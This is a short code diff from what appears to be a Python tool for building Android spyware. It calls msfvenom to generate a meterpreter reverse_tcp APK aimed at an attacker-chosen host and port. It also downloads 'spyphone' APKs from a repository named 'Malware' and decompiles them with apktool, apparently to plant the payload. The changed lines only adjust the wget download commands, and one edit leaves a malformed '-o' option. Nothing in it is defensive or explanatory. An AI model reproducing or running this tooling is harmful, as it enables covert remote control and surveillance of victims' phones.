@@ -90,7 +90,7 @@ def payload():
 	os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" -o Malware/payload.apk")
 	
 def spyphone_V14():
-	os.system("wget http://github.com/PyRAT-svg/Malware/raw/master/spyphone_V14.apk -o Malware/spyphone.apk && mv -f spyphone.apk Malware/spyphone.apk")
+	os.system("wget http://github.com/PyRAT-svg/Malware/raw/master/spyphone_V14.apk && mv -f spyphone_V14.apk Malware/spyphone.apk")
 	os.system("cd Malware && rm -rf payload.apk payload spyphone")
 	os.system("cd Malware && apktool d spyphone.apk -o spyphone")
 	os.system("rm -rf Malware/spyphone.apk")
@@ -106,7 +106,7 @@ def spyphone_V14():
 
 	
 def spyphone():
-	os.system("wget http://github.com/PyRAT-svg/Malware/raw/master/spyphone.apk -o Malware/spyphone.apk && mv -f spyphone.apk Malware/spyphone.apk")
+	os.system("wget http://github.com/PyRAT-svg/Malware/raw/master/spyphone.apk -o && mv -f spyphone.apk Malware/spyphone.apk")
 	os.system("cd Malware && rm -rf payload.apk payload spyphone")
 	os.system("cd Malware && apktool d spyphone.apk -o spyphone")
 	os.system("rm -rf Malware/spyphone.apk")
